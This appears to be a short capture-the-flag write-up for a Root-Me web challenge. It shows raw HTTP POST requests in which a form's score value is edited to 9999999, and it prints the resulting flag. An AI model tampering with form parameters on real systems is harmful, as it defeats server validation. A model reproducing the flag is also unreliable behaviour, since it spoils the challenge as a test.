# HTTP - POST



Initial page seems like generating some random number < 999999 -> Request

POST /web-serveur/ch56/ HTTP/1.1 Host: challenge01.root-me.org User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 36 Origin: http://challenge01.root-me.org Connection: close Referer: http://challenge01.root-me.org/web-serveur/ch56/ Cookie: \_ga\_SRYSKX09J7=GS1.1.1661155511.14.0.1661155511.0.0.0; \_ga=GA1.1.536088429.1661133467 Upgrade-Insecure-Requests: 1

score=number\&generate=Give+a+try%21

\->

modified Request

POST /web-serveur/ch56/ HTTP/1.1 Host: challenge01.root-me.org User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 36 Origin: http://challenge01.root-me.org Connection: close Referer: http://challenge01.root-me.org/web-serveur/ch56/ Cookie: \_ga\_SRYSKX09J7=GS1.1.1661155511.14.0.1661155511.0.0.0; \_ga=GA1.1.536088429.1661133467 Upgrade-Insecure-Requests: 1

score=9999999\&generate=Give+a+try%21

\->

```
   <p>Wow, 9999999! How did you do that? :o</p><p>Flag to validate the challenge: <strong>H7tp_h4s_N0_s3Cr37S_F0r_y0U
```



HTTP GET param <-> HTTP POST data where data is called as form while data can be sent by xml or json
